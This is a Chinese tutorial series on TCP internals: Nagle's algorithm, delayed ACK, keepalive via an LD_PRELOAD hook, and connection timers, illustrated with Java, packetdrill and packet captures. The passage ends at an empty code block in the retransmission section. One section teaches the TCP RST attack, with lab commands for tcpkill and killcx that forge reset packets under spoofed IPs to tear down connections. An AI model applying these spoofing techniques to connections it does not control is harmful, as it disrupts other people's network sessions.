![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a49eab60168bb9)



可以看到除了第一个包是单独发送，后面的四个包合并到了一起，所以文章开头的答案是 C

那为什么是这样的呢？这就是我们今天要讲的重点 Nagle 算法。

## nagle 算法

简单来讲 nagle 算法讲的是减少发送端频繁的发送小包给对方。

Nagle 算法要求，当一个 TCP 连接中有在传数据（已经发出但还未确认的数据）时，小于 MSS 的报文段就不能被发送，直到所有的在传数据都收到了 ACK。同时收到 ACK 后，TCP 还不会马上就发送数据，会收集小包合并一起发送。网上有人想象的把 Nagle 算法说成是「hold 住哥」，我觉得特别形象。

算法思路如下：

```
if there is new data to send
  if the window size >= MSS and available data is >= MSS
    send complete MSS segment now
  else
    if there is unconfirmed data still in the pipe
      enqueue data in the buffer until an acknowledge is received
    else
      send data immediately
    end if
  end if
end if
```

默认情况下 Nagle 算法都是启用的，Java 可以通过 `setTcpNoDelay(true);`来禁用 Nagle 算法。

还是上面的代码，修改代码开启 TCP_NODELAY 禁用 Nagle 算法

```
省略...
Socket socket = new Socket();
socket.setTcpNoDelay(true);
省略...
```

再次抓包

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a49eab61eae538)



可以看到几乎同一瞬间分 5 次把数据发送了出去，不管之前发出去的包有没有收到 ACK。 Nagle 算法开启前后对比如下图所示

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a49eab67e29995)



## 用 packetdrill 来演示 Nagle 算法

如果不想写那么长的 Java 代码，可以用 packetdrill 代码来演示。同样的做法是发送端短时间内发送 5 个小包。先来看 Nagle 算法开启的情况

```
  1  --tolerance_usecs=100000
  2 0.000 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
  3 // 0.010 setsockopt(3, SOL_TCP, TCP_NODELAY, [1], 4) = 0
  4
  5 0.100...0.200 connect(3, ..., ...) = 0
  6
  7 // Establish a connection.
  8 0.100 > S 0:0(0) <mss 1460,sackOK,TS val 100 ecr 0,nop,wscale 7>
  9 0.200 < S. 0:0(0) ack 1 win 32792 <mss 1100,nop,wscale 7>
 10 0.200 > . 1:1(0) ack 1
 11
 12 +0 write(3, ..., 10) = 10
 13 +0 write(3, ..., 10) = 10
 14 +0 write(3, ..., 10) = 10
 15 +0 write(3, ..., 10) = 10
 16 +0 write(3, ..., 10) = 10
 17
 18  +0.030 < . 1:1(0) ack 11 win 257
 19  +0.030 < . 1:1(0) ack 21 win 257
 20  +0.030 < . 1:1(0) ack 31 win 257
 21  +0.030 < . 1:1(0) ack 41 win 257
 22  +0.030 < . 1:1(0) ack 51 win 257
 23
 24 +0 `sleep 1000000`
```

先注释掉第三行，关闭 TCP_NODELAY，用 packetdrill 执行脚本`sudo packetdrill nagle.pkt`抓包结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a49eab6fb73b7b)



结果如我们预期，第一个包正常发送，等第 1 次包收到 ACK 回复以后，后面的 4 次包合并在一起发送出去。

现在去掉第三行的注释，禁用 Nagle 算法，重新运行抓包

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a49eab64a55a0c)



可以看到这次发送端没有等对端回复 ACK，就把所有的小包一个个发出去了。

## 一个典型的小包场景：SSH

一个典型的大量小包传输的场景是用 ssh 登录另外一台服务器，每输入一个字符，服务端也随即进行回应，客户端收到了以后才会把输入的字符和响应的内容显示在自己这边。比如登录服务器后输入`ls`然后换行，中间包交互的过程如下图



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a49eab763863bd)



1. 客户端输入`l`，字符 `l` 被加密后传输给服务器
2. 服务器收到`l`包，回复被加密的 `l` 及 ACK
3. 客户端输入`s`，字符 `s` 被加密后传输给服务器
4. 服务器收到`s`包，回复被加密的 `s` 及 ACK
5. 客户端输入 enter 换行符，换行符被加密后传输给服务器
6. 服务器收到换行符，回复被加密的换行符及 ACK
7. 服务端返回执行 ls 的结果
8. 客户端回复 ACK

## Nagle 算法的意义在哪里

Nagle 算法的作用是减少小包在客户端和服务端直接传输，一个包的 TCP 头和 IP 头加起来至少都有 40 个字节，如果携带的数据比较小的话，那就非常浪费了。就好比开着一辆大货车运一箱苹果一样。

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a49eac0e76757b)



Nagle 算法在通信时延较低的场景下意义不大。在 Nagle 算法中 ACK 返回越快，下次数据传输就越早。

假设 RTT 为 10ms 且没有延迟确认（这个后面会讲到），那么你敲击键盘的间隔大于 10ms 的话就不会触发 Nagle 的条件：只有接收到所有的在传数据的 ACK 后才能继续发数据，也即如果所有的发出去的包 ACK 都收到了，就不用等了。如果你想触发 Nagle 的停等（stop-wait）机制，1s 内要输入超过 100 个字符。因此如果在局域网内，Nagle 算法基本上没有什么效果。

如果客户端到服务器的 RTT 较大，比如多达 200ms，这个时候你只要1s 内输入超过 5 个字符，就有可能触发 Nagle 算法了。

**Nagle 算法是时代的产物**：Nagle 算法出现的时候网络带宽都很小，当有大量小包传输时，很容易将带宽占满，出现丢包重传等现象。因此对 ssh 这种交互式的应用场景，选择开启 Nagle 算法可以使得不再那么频繁的发送小包，而是合并到一起，代价是稍微有一些延迟。现在的 ssh 客户端已经默认关闭了 Nagle 算法。

## 小结

这篇文章主要介绍了非常经典的 Nagle 算法，这个算法可以有效的减少网络上小包的数量。Nagle 算法是应用在发送端的，简而言之就是，对发送端而言：

- 当第一次发送数据时不用等待，就算是 1byte 的小包也立即发送
- 后面发送数据时需要累积数据包直到满足下面的条件之一才会继续发送数据：
    - 数据包达到最大段大小MSS
    - 接收端收到之前数据包的确认 ACK

不过 Nagle 算法是时代的产物，可能会导致较多的性能问题，尤其是与我们下一篇文章要介绍的延迟确认一起使用的时候。很多组件为了高性能都默认禁用掉了这个特性。

这篇文章我们来介绍延迟确认。

首先必须明确两个观点：

- 不是每个数据包都对应一个 ACK 包，因为可以合并确认。
- 也不是接收端收到数据以后必须立刻马上回复确认包。

如果收到一个数据包以后暂时没有数据要分给对端，它可以等一段时间（Linux 上是 40ms）再确认。如果这段时间刚好有数据要传给对端，ACK 就可以随着数据一起发出去了。如果超过时间还没有数据要发送，也发送 ACK，以免对端以为丢包了。这种方式成为「延迟确认」。

这个原因跟 Nagle 算法其实一样，回复一个空的 ACK 太浪费了。

- 如果接收端这个时候恰好有数据要回复客户端，那么 ACK 搭上顺风车一块发送。
- 如果期间又有客户端的数据传过来，那可以把多次 ACK 合并成一个立刻发送出去
- 如果一段时间没有顺风车，那么没办法，不能让接收端等太久，一个空包也得发。

这种机制被称为延迟确认（delayed ack），思破哥的文章把延迟确认（delayed-ack）称为「**磨叽姐**」，挺形象的。TCP 要求 ACK 延迟的时延必须小于500ms，一般操作系统实现都不会超过200ms。

延迟确认在很多 linux 机器上是没有办法关闭的，

那么这里涉及的就是一个非常根本的问题：「收到数据包以后什么时候该回复 ACK」

## 什么时候需要回复 ACK

[tcp_input.c](https://elixir.bootlin.com/linux/v2.6.11/source/net/ipv4/tcp_input.c)

```
static void __tcp_ack_snd_check(struct sock *sk, int ofo_possible)
{
	struct tcp_sock *tp = tcp_sk(sk);

	    /* More than one full frame received... */
	if (((tp->rcv_nxt - tp->rcv_wup) > tp->ack.rcv_mss
	     /* ... and right edge of window advances far enough.
	      * (tcp_recvmsg() will send ACK otherwise). Or...
	      */
	     && __tcp_select_window(sk) >= tp->rcv_wnd) ||
	    /* We ACK each frame or... */
	    tcp_in_quickack_mode(tp) ||
	    /* We have out of order data. */
	    (ofo_possible &&
	     skb_peek(&tp->out_of_order_queue))) {
		/* Then ack it now */
		tcp_send_ack(sk);
	} else {
		/* Else, send delayed ack. */
		tcp_send_delayed_ack(sk);
	}
}
```

可以看到需要立马回复 ACK 的场景有：

- 如果接收到了大于一个的报文，且需要调整窗口大小
- 处于 quickack 模式（tcp_in_quickack_mode）
- 收到乱序包（We have out of order data.）

其它情况一律使用延迟确认的方式

需要重点关注的是：tcp_in_quickack_mode()

```
/* Send ACKs quickly, if "quick" count is not exhausted
 * and the session is not interactive.
 */

static __inline__ int tcp_in_quickack_mode(struct tcp_sock *tp)
{
	return (tp->ack.quick && !tp->ack.pingpong);
}

/* Delayed ACK control data */
struct {
	__u8	pending;	/* ACK is pending */
	__u8	quick;		/* Scheduled number of quick acks	*/
	__u8	pingpong;	/* The session is interactive		*/
	__u8	blocked;	/* Delayed ACK was blocked by socket lock*/
	__u32	ato;		/* Predicted tick of soft clock		*/
	unsigned long timeout;	/* Currently scheduled timeout		*/
	__u32	lrcvtime;	/* timestamp of last received data packet*/
	__u16	last_seg_size;	/* Size of last incoming segment	*/
	__u16	rcv_mss;	/* MSS used for delayed ACK decisions	*/ 
} ack;
```

内核 tcp_sock 结构体中有一个 ack 子结构体，内部有一个 quick 和 pingpong 两个字段，其中pingpong 就是判断交互连接的，只有处于非交互 TCP 连接才有可能即进入 quickack 模式。

什么是交互式和 pingpong 呢？

顾名思义，其实有来有回的双向数据传输就叫 pingpong，对于通信的某一端来说，`R-W-R-W-R-W...`（R 表示读，W 表示写）

延迟确认出现的最多的场景是 `W-W-R`（写写读），我们来分析一下这种场景。

## 延迟确认实际例子演示

可以用一段 java 代码演示延迟确认。

服务端代码如下，当从服务端 readLine 有返回非空字符串（读到`\n 或 \r`）就把字符串原样返回给客户端

```
public class DelayAckServer {
    private static final int PORT = 8888;

    public static void main(String[] args) throws IOException {
        ServerSocket serverSocket = new ServerSocket();
        serverSocket.bind(new InetSocketAddress(PORT));
        System.out.println("Server startup at " + PORT);
        while (true) {
            Socket socket = serverSocket.accept();
            InputStream inputStream = socket.getInputStream();
            OutputStream outputStream = socket.getOutputStream();
            int i = 1;
            while (true) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                String line = reader.readLine();
                if (line == null) break;
                System.out.println((i++) + " : " + line);
                outputStream.write((line + "\n").getBytes());
            }
        }
    }
}
```

下面是客户端代码，客户端分两次调用 write 方法，模拟 http 请求的 header 和 body。第二次 write 包含了换行符（\n)，然后测量 write、write、read 所花费的时间。

```
public class DelayAckClient {
    public static void main(String[] args) throws IOException {
        Socket socket = new Socket();
        socket.connect(new InetSocketAddress("server_ip", 8888));
        InputStream inputStream = socket.getInputStream();
        OutputStream outputStream = socket.getOutputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
        String head = "hello, ";
        String body = "world\n";

        for (int i = 0; i < 10; i++) {
            long start = System.currentTimeMillis();
            outputStream.write(("#" + i + " " + head).getBytes()); // write
            outputStream.write((body).getBytes()); // write
            String line = reader.readLine(); // read
            System.out.println("RTT: " + (System.currentTimeMillis() - start) + ": " + line);
        }
        inputStream.close();
        outputStream.close();
        socket.close();
    }
}
```

运行结果如下

```
javac DelayAckClient.java; java -cp . DelayAckClient
RTT: 1: #0 hello, world
RTT: 44: #1 hello, world
RTT: 46: #2 hello, world
RTT: 44: #3 hello, world
RTT: 42: #4 hello, world
RTT: 41: #5 hello, world
RTT: 41: #6 hello, world
RTT: 44: #7 hello, world
RTT: 44: #8 hello, world
RTT: 44: #9 hello, world
```

除了第一次，剩下的 RTT 全为 40 多毫秒。这刚好是 Linux 延迟确认定时器的时间 40ms 抓包结果如下:

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a006acf0a4e73f)



对包逐个分析一下 1 ~ 3：三次握手 4 ~ 9：第一次 for 循环的请求，也就是 W-W-R 的过程

- 4：客户端发送 "#0 hello, " 给服务端
- 5：因为服务端只收到了数据还没有回复过数据，tcp 判断不是 pingpong 的交互式数据，属于 quickack 模式，立刻回复 ACK
- 6：客户端发送 "world\n" 给服务端
- 7：服务端因为还没有回复过数据，tcp 判断不是 pingpong 的交互式数据，服务端立刻回复 ACK
- 8：服务端读到换行符，readline 函数返回，会把读到的字符串原样写入到客户端。TCP 这个时候检测到是 pingpong 的交互式连接，进入延迟确认模式
- 9：客户端收到数据以后回复 ACK

10 ~ 14：第二次 for 循环

- 10：客户端发送 "#1 hello, " 给服务端。服务端收到数据包以后，因为处于 pingpong 模式，开启一个 40ms 的定时器，奢望在 40ms 内有数据回传
- 11：很不幸，服务端等了 40ms 定期器到期都没有数据回传，回复确认 ACK 同时取消 pingpong 状态
- 12：客户端发送 "world\n" 给服务端
- 13：因为服务端不处于 pingpong 状态，所以收到数据立即回复 ACK
- 14：服务端读到换行符，readline 函数返回，会把读到的字符串原样写入到客户端。这个时候又检测到收发数据了，进入 pingpong 状态。

从第二次 for 开始，后面的数据包都一样了。 整个过程包交互图如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a006ace9ddc4ef)



## 用 packetdrill 模拟延迟确认

```
--tolerance_usecs=100000
0.000 socket(..., SOCK_STREAM, IPPROTO_TCP) = 3
0.000 setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
0.000 bind(3, ..., ...) = 0
0.000 listen(3, 1) = 0

0.000 < S 0:0(0) win 32792 <mss 1000, sackOK, nop, nop, nop, wscale 7>
0.000 > S. 0:0(0) ack 1 <...>

0.000 < . 1:1(0) ack 1 win 257

0.000 accept(3, ..., ...) = 4

+ 0 setsockopt(4, SOL_TCP, TCP_NODELAY, [1], 4) = 0

// 模拟往服务端写入 HTTP 头部: POST / HTTP/1.1
+0 < P. 1:11(10) ack 1 win 257

// 模拟往服务端写入 HTTP 请求 body: {"id": 1314}
+0 < P. 11:26(15) ack 1 win 257

// 往 fd 为4 的 模拟服务器返回 HTTP response {}
+ 0 write(4, ..., 100) = 100


// 第二次模拟往服务端写入 HTTP 头部: POST / HTTP/1.1
+0 < P. 26:36(10) ack 101 win 257

// 抓包看服务器返回

+0 `sleep 1000000`
```

这个构造包的过程跟前面的思路是一模一样的，抓包同样复现了 40ms 延迟的现象。



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a006acecf83ba7)



## 可以设置关掉延迟确认吗？

这个是我刚开始学习 TCP 的一个疑惑，既然是 TCP 的一个特性，那有没有一个开关可以开启或者关闭延迟确认呢？ 答案是否定的，大部分 Linux 实现上并没有开关可以关闭延迟确认。我曾经以为它是一个 sysctl 项，可是后来找了很久都没有找到，没有办法通过一个配置彻底关掉或者开启 Linux 的延迟确认。

## 当 Nagle 算法遇到延迟确认

Nagle 算法和延迟确认本身并没有什么问题，但一起使用就会出现很严重的性能问题了。Nagle 攒着包一次发一个，延迟确认收到包不马上回。

如果我们把上面的 Java 代码稍作调整，禁用 Nagle 算法可以试一下。

```
Socket socket = new Socket();
socket.setTcpNoDelay(true); // 禁用 Nagle 算法
socket.connect(new InetSocketAddress("server ip", 8888));
```

运行 Client 端，可以看到 RTT 几乎为 0

```
RTT: 1: #0 hello, world
RTT: 0: #1 hello, world
RTT: 1: #2 hello, world
RTT: 1: #3 hello, world
RTT: 0: #4 hello, world
RTT: 1: #5 hello, world
RTT: 1: #6 hello, world
RTT: 0: #7 hello, world
RTT: 1: #8 hello, world
RTT: 0: #9 hello, world
```

抓包结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a006aceed2734f)



黑色背景部分的是客户端发送给服务端的请求包，可以看到在禁用 Nagle 的情况下，不用等一个包发完再发下一个，而是几乎同时把两次写请求发送出来了。服务端收到带换行符的包以后，立马可以返回结果，ACK 可以捎带过去，就不会出现延迟 40ms 的情况。

## 小结

这篇文章主要介绍了延迟确认出现的背景和原因，然后用一个实际的代码演示了延迟确认的具体的细节。到这里 Nagle 算法和延迟确认这两个主题就介绍完毕了。

一个 TCP 连接上，如果通信双方都不向对方发送数据，那么 TCP 连接就不会有任何数据交换。这就是我们今天要讲的 TCP keepalive 机制的由来。

## 永远记住 TCP 不是轮询的协议

网络故障或者系统宕机都将使得对端无法得知这个消息。如果应用程序不发送数据，可能永远无法得知该连接已经失效。假设应用程序是一个 web 服务器，客户端发出三次握手以后故障宕机活着被踢掉网线，对于 web 服务器而已，下一个数据包将永远无法到来，但是它一无所知。TCP 不会采用类似于轮询的方式来询问：小老弟你有什么东西要发给我吗？

这种情况下服务端会永远处于 ESTABLISHED 吗？



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a047d01a97dbcd)



## TCP 的 half open

上面所说的情况就是典型的 TCP「半打开 half open」

> 这一个情况就是如果在未告知另一端的情况下通信的一端关闭或终止连接，那么就认为该条TCP连接处于半打开状态。 这种情况发现在通信的一方的主机崩溃、电源断掉的情况下。 只要不尝试通过半开连接来传输数据，正常工作的一端将不会检测出另外一端已经崩溃。

## 模拟客户端网络故障

准备两台虚拟机 c1（服务器），c2（客户端）。在 c1 上执行 `nc -l 8080` 启动一个 TCP 服务器监听 8080 端口，同时在服务器 c1 上执行 tcpdump 查看包发送的情况。 在 c2 上用 `nc c1 8080`创建一条 TCP 连接 在 c1 上执行 netstat 查看连接状态，可以看到服务端已处于 ESTABLISHED 状态

```
sudo netstat -lnpa | grep -i 8080
tcp        0      0 10.211.55.5:8080        10.211.55.10:60492      ESTABLISHED 2787/nc
```

这时断掉 c1 的网络连接，可以看到 tcpdump 抓包没有任何包交互。此时再用 netstat 查看，发现连接还是处于 ESTABLISHED 状态。

过了几个小时以后再来查看，依旧是 ESTABLISHED 状态，且 tcpdump 输出显示没有任何包传输。

## TCP 的 keepalive

TCP 协议的设计者考虑到了这种检测长时间死连接的需求，于是乎设计了 keepalive 机制。 在我的 CentOS 机器上，keepalive 探测包发送数据 7200s，探测 9 次，每次探测间隔 75s，这些值都有对应的参数可以配置。

为了能更快的演示，修改 centos 机器上 keepalive 相关的参数如下

```
// 30s没有数据包交互发送 keepalive 探测包
echo 30 > /proc/sys/net/ipv4/tcp_keepalive_time
// 每次探测TCP 包间隔
echo 10 > /proc/sys/net/ipv4/tcp_keepalive_intvl
// 探测多少次
echo 5 > /proc/sys/net/ipv4/tcp_keepalive_probes
```

默认情况下 nc 是没有开启 keepalive 的，怎么样在不修改 nc 源码的情况下，让它拥有 keepalive 的功能呢？

正常情况下，我们设置 tcp 的 keepalive 选项的代码如下：

```
int flags = 1;
setsockopt(socket_fd, SOL_TCP, TCP_KEEPALIVE, (void *)&flags, sizeof(flags)
```

我们可以用 strace 看下 `nc -l 8080`背后的系统调用

```
socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) = 4
setsockopt(4, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(4, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("0.0.0.0")}, 128) = 0
listen(4, 10)
```

可以看到 nc 只调用 setsockopt 设置了 SO_REUSEADDR 允许端口复用，并没有设置 TCP_KEEPALIVE，那我们 hook 一下 setsockopt 函数调用，让它在设置端口复用的同时设置 TCP_KEEPALIVE。那怎么样来做 hook 呢？

## 偷梁换柱之 LD_PRELOAD

LD_PRELOAD 是一个 Linux 的环境变量，运行在程序运行前优先加载动态链接库，类似于 Java 的字节码改写 instrument。通过这个环境变量，我们可以修改覆盖真正的系统调用，达到我们的目的。 这个过程如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a047d01b7d0273)



新建文件 setkeepalive.c，全部代码如下：

```
#include <sys/socket.h>
#include <stdio.h>
#include <dlfcn.h>
#include <string.h>

static int (*real_setsockopt)(int , int , int , void *, socklen_t) = NULL;

__attribute__((constructor)) void init() {
    real_setsockopt = dlsym(RTLD_NEXT, "setsockopt");
}

int setsockopt(int sockfd, int level, int optname,
               const void *optval, socklen_t optlen) {
        printf("SETSOCKOPT: %d: level: %d %d=%d (%d)\r\n",
 sockfd, level, optname, *(int*)optval, optlen);
        // 调用原函数
        real_setsockopt(sockfd, level, optname, &optval, optlen);
        // 判断是否是 SO_REUSEADDR
        if (level == SOL_SOCKET && optname == SO_REUSEADDR) {
                int val = 1;
                // 设置 SO_KEEPALIVE
                real_setsockopt(sockfd, SOL_SOCKET, SO_KEEPALIVE, &val, optlen);
                return 0;
        }
  return 0;
}
```

编译上面的 setkeepalive.c 文件为 .so 文件： `gcc setkeepalive.c -fPIC -D_GNU_SOURCE -shared -ldl -o setkeepalive.so`

替换并测试运行

```
LD_PRELOAD=./setkeepalive.so nc -l 8080
```

再来重复上面的测试流程，抓包如下：



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16a047d01e58b593)



完美的展现了 keepalive 包的探测的过程: 1 ~ 3：三次握手，随后模拟客户端断网 4：30s 以后服务端发送第一个探测包（对应 tcp_keepalive_time） 5 ~ 8：因探测包一直没有回应，每隔 10s 发出剩下的 4 次探测包 9：5 次探测包以后，服务端觉得没有希望了，发出 RST 包，断掉这个连接

## 为什么大部分应用程序都没有开启 keepalive 选项

现在大部分应用程序（比如我们刚用的 nc）都没有开启 keepalive 选项，一个很大的原因就是默认的超时时间太长了，从没有数据交互到最终判断连接失效，需要花 2.1875 小时（7200 + 75 * 9），显然太长了。但如果修改这个值到比较小，又违背了 keepalive 的设计初衷（为了检查长时间死连接）

## 对我们的启示

在应用层做连接的有效性检测是一个比较好的实践，也就是我们常说的心跳包。

## 小结

这篇文章我们介绍了 TCP keepalive 机制的由来，通过定时发送探测包来探测连接的对端是否存活，不过默认情况下需要 7200s 没有数据包交互才会发送 keepalive 探测包，往往这个时间太久了，我们熟知的很多组件都没有开启 keepalive 特性，而是选择在应用层做心跳机制。

## 思考题

TCP 的 keepalive 与 HTTP 的 keep-alive 有什么区别？

这篇文章我们来介绍 TCP RST 攻击以及如何在不干预通信双方进程的情况下杀掉一条 TCP 连接。

## RST 攻击

RST 攻击也称为伪造 TCP 重置报文攻击，通过伪造 RST 报文来关闭掉一个正常的连接。

源 IP 地址伪造非常容易，不容易被伪造的是序列号，RST 攻击最重要的一点就是构造的包的序列号要落在对方的滑动窗口内，否则这个 RST 包会被忽略掉，达不到攻击的效果。

下面我们用实验演示不在滑动窗口内的 RST 包会被忽略的情况，完整的代码见：[rst_out_of_window.pkt](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_rst/rst_out_of_window.pkt)

```
+0 < S 0:0(0) win 32792 <mss 1460> 
+0 > S. 0:0(0) ack 1 <...>
+.1 < . 1:1(0) ack 1 win 65535 
+0 accept(3, ..., ...) = 4

// 不在窗口内的 RST
+.010 < R. 29202:29202(0) ack 1 win 65535

// 如果上面的 RST 包落在窗口内，连接会被重置，下面的写入不会成功
+.010 write(4, ..., 1000) = 1000 

// 断言服务端会发出下面的数据包
+0 > P. 1:1001(1000) ack 1 <...>
```

执行上面的脚本，抓包的结果如下，完整的包见：[rst_out_of_window.pcap](https://github.com/arthur-zhang/tcp_ebook/blob/master/tcp_rst/rst_out_of_window.pcap)



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/201906221561214405280615612144052280.jpg)



抓包文件中的第 5 个包可以看到，write 调用成功，1000 字节发送成功，write 调用并没有收到 RST 包的影响。

下面来介绍两个工具，利用 RST 攻击的方式来杀掉一条连接。

## 工具一：tcpkill 工具使用及原理介绍

Centos 下安装 tcpkill 命令步骤如下

```
yum install epel-release -y
yum install dsniff -y
```

实验步骤： 1、机器 c2(10.211.55.10) 启动 nc 命令监听 8080 端口，充当服务器端，记为 B

```
nc -l 8080
```

2、机器 c2 启动 tcpdump 抓包

```
sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap
```

3、本地机器终端（10.211.55.2，记为 A）使用 nc 与 B 的 8080 端口建立 TCP 连接

```
nc c2 8080
```

在服务端 B 机器上可以看到这条 TCP 连接

```
netstat -nat | grep -i 8080
tcp        0      0 10.211.55.10:8080       10.211.55.2:60086       ESTABLISHED
```

4、启动 tcpkill

```
sudo tcpkill -i eth0 port 8080
```

注意这个时候 tcp 连接依旧安然无恙，并没有被杀掉。

5、在本地机器终端 nc 命令行中随便输入一点什么，这里输入`hello`，发现这时服务端和客户端的 nc 进程已经退出了

下面来分析抓包文件，这个文件可以从我的 github 下载 [tcpkill.pcap](https://github.com/arthur-zhang/tcp_ebook/tree/master/kill_tcp_connection)



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7eb9c7490b760)



可以看到，tcpkill 假冒了 A 和 B 的 IP发送了 RST 包给通信的双方，那问题来了，伪造 ip 很简单，它是怎么知道当前会话的序列号的呢？

tcpkill 的原理跟 tcpdump 差不多，会通过 libpcap 库抓取符合条件的包。 因此只有有数据传输的 tcp 连接它才可以拿到当前会话的序列号，通过这个序列号伪造 IP 发送符合条件的 RST 包。

原理如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7eb9c74a68a15)



可以看到 tcpkill 对每个端发送了 3 个RST 包，这是因为在高速数据传输的连接上，根据当前抓的包计算的序列号可能已经不再 TCP 连接的窗口内了，这种情况下 RST 包会被忽略，因此默认情况下 tcpkill 未雨绸缪往后计算了几个序列号。还可以指定参数`-n`指定更多的 RST 包，比如`tcpkill -9`

根据上面的分析 tcpkill 的局限还是很明显的，无法杀掉一条僵死连接，下面我们介绍一个新的工具 killcx，看看它是如何来处理这种情况的。

## killcx

killcx 是一个用 perl 写的在 linux 下可以关闭 TCP 连接的脚本，无论 TCP 连接处于什么状态。

下面来做一下实验，实验的前几步骤跟第一个例子中一模一样

1、机器 c2(10.211.55.10) 启动 nc 命令监听 8080 端口，充当服务器端，记为 B

```
nc -l 8080
```

2、机器 c2 启动 tcpdump 抓包

```
sudo tcpdump -i any port 8080 -nn -U -vvv -w test.pcap
```

3、本地机器终端（10.211.55.2，记为 A）使用 nc 与 B 的 8080 端口建立 TCP 连接

```
nc c2 8080
```

在服务端 B 机器上可以看到这条 TCP 连接

```
netstat -nat | grep -i 8080
tcp        0      0 10.211.55.10:8080       10.211.55.2:61632       ESTABLISHED
```

4、客户端 A nc 命令行随便输入什么，这一步也完全可以省略，这里输入"hello\n"

5、执行 killcx 命令，注意 killcx 是在步骤 4 之后执行的

```
sudo ./killcx 10.211.55.2:61632
```

可以看到服务端和客户端的 nc 进程已经退出了。

抓包的结果如下

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7eb9cac8894d7)



前 5 个包都很正常，三次握手加上一次数据传输，有趣的事情从第 6 个包开始

- 第 6 个包是 killcx 伪造 IP 向服务端 B 发送的一个 SYN 包
- 第 7 个包是服务端 B 回复的 ACK 包，里面包含的 SEQ 和 ACK 号
- 第 8 个包是 killcx 伪造 IP 向服务端 B 发送的 RST 包
- 第 9 个包是 killcx 伪造 IP 向客户端 A 发送的 RST 包

整个过程如下图所示



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b7eb9c74a1f89a)



## 小结

这篇文章介绍了杀掉 TCP 连接的两个工具 tcpkill 和 killcx：

- tcpkill 采用了比较保守的方式，抓取流量等有新包到来的时候，获取 SEQ/ACK 号，这种方式只能杀掉有数据传输的连接
- killcx 采用了更加主动的方式，主动发送 SYN 包获取 SEQ/ACK 号，这种方式活跃和非活跃的连接都可以杀掉

## 扩展阅读

有大神把 tcpkill 源代码魔改了一下，让 tcpkill 也支持了杀掉非活跃连接，原理上就是结合了 killcx 杀掉连接的方式，模拟 SYN 包。有兴趣的读者可以好好读一下：[yq.aliyun.com/articles/59…](https://yq.aliyun.com/articles/59308)

TCP 为每条连接建立了 7 个定时器：

- 连接建立定时器
- 重传定时器
- 延迟 ACK 定时器
- PERSIST 定时器
- KEEPALIVE 定时器
- FIN_WAIT_2 定时器
- TIME_WAIT 定时器

大部分定时器在前面的文章已经介绍过了，这篇文章来总结一下。

## 0x01 连接建立定时器（connection establishment）

当发送端发送 SYN 报文想建立一条新连接时，会开启连接建立定时器，如果没有收到对端的 ACK 包将进行重传。

可以用一个最简单的 packetdrill 脚本来模拟这个场景

```
// 新建一个 server socket
+0   socket(..., SOCK_STREAM, IPPROTO_TCP) = 3

// 客户端 connect
+0 connect(3, ..., ...) = -1
```

抓包结果如下



![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b03db345b63f36)



在我的电脑上，将重传 6 次（间隔 1s、2s、4s、8s、16s、32s），6 次重试以后放弃重试，connect 调用返回 -1，调用超时，

这个值是由/proc/sys/net/ipv4/tcp_syn_retries决定的， 在我的 Centos 机器上，这个值等于 6

整个过程如下：

![img](%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TCP%E5%8D%8F%E8%AE%AE.assets/16b03db33ad849aa)



如果是用 Java 语言就会返回`java.net.ConnectException: Connection timed out`异常

## 0x02 重传定时器（retransmission）

第一个定时器讲的是连接建立没有收到 ACK 的情况，如果在发送数据包的时候没有收到 ACK 呢？这就是这里要讲的第二个定时器重传定时器。重传定时器在之前的文章中有专门一篇文章介绍，重传定时器的时间是动态计算的，取决于 RTT 和重传的次数。

还是用 packetdrill 脚本的方式来模拟

```
